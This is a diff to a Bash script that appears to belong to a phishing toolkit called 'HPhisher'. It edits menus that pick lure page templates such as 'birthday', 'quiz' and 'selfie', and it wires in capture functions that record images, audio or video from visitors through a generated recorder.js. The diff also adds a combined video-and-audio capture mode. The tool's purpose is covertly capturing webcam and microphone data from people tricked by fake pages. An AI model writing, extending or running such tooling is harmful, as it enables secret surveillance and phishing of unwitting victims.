@@ -462,12 +462,14 @@ setup_site() {
 
 #Capture data check
 capture_data_check(){
-	if [ site_name=image ];then
+	if [ type=image ];then
                 capture_data_image
-        elif [ site_name=audio ];then
+        elif [ type=audio ];then
                 capture_data_audio
-        elif [ site_name=video ];then
+        elif [ type=video ];then
                 capture_data_video
+	elif [ type=both ];then
+               capture_data_video_audio
 	else
 	    	echo " Error Occured!!"
         fi
@@ -713,6 +715,7 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} 
 
 site_image(){
 clear
+type=image
 echo -e " "
 echo -e " "
 banner
@@ -736,44 +739,45 @@ case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
-			2 | 02)
-			        site_template="birthday"
-			        tunnel_menu;;
-			3 | 03)
-			        site_template="book"
-				tunnel_menu;;
-			4 | 04)
-			        site_template="boxwish"
-			        tunnel_menu;;
-			5 | 05)
-			 	site_template="firework"
-				tunnel_menu;;
-			6 | 06)
-				site_template="game"
-				tunnel_menu;;
-			7 | 07)
-				site_template="guess"
-				tunnel_menu;;
-			8 | 08)
-				site_template="quiz"
-				tunnel_menu;;
-			9 | 09)
-				site_template="rps"
-				tunnel_menu;;
-			10)
-				site_template="selfie"
-				tunnel_menu;;
-			11)
-				site_template="spinwheel"
-				tunnel_menu;;
+	2 | 02)
+	        site_template="birthday"
+		tunnel_menu;;
+	3 | 03)
+		site_template="book"
+		tunnel_menu;;
+	4 | 04)
+		site_template="boxwish"
+		tunnel_menu;;
+	5 | 05)
+		site_template="firework"
+		tunnel_menu;;
+	6 | 06)
+		site_template="game"
+		tunnel_menu;;
+	7 | 07)
+		site_template="guess"
+		tunnel_menu;;
+	8 | 08)
+		site_template="quiz"
+		tunnel_menu;;
+	9 | 09)
+		site_template="rps"
+		tunnel_menu;;
+	10)
+		site_template="selfie"
+		tunnel_menu;;
+	11)
+		site_template="spinwheel"
+		tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_image; };;
+                { sleep 1; banner; site_image; };;
 esac
 }
 
 site_audio(){
 clear
+type=audio
 echo -e " "
 echo -e " "
 banner
@@ -827,8 +831,8 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-rm -rf ${sites_dir}/${site_name}/${site_template}/recorder.js
-sed "s+mediaType+"$type"+g" ${sites_dir}/${site_name}/${site_template}/template.js | sed "s+recordingTime+"$DURATION"+g" > ${sites_dir}/${site_name}/${site_template}/recorder.js
+rm -rf ${sites_dir}/video/${site_template}/recorder.js
+sed "s+mediaType+"$type"+g" ${sites_dir}/video/${site_template}/template.js | sed "s+recordingTime+"$duration"+g" > ${sites_dir}/video/${site_template}/recorder.js
 }
 
 site_video_audio(){
@@ -865,8 +869,8 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-rm -rf ${sites_dir}/${site_name}/${site_template}/recorder.js
-sed "s+mediaType+"$type"+g" ${sites_dir}/${site_name}/${site_template}/template.js | sed "s+recordingTime+"$DURATION"+g" > ${sites_dir}/${site_name}/${site_template}/recorder.js
+rm -rf ${sites_dir}/video/${site_template}/recorder.js
+sed "s+mediaType+"$type"+g" ${sites_dir}/video/${site_template}/template.js | sed "s+recordingTime+"$duration"+g" > ${sites_dir}/video/${site_template}/recorder.js
 }
 
 clear
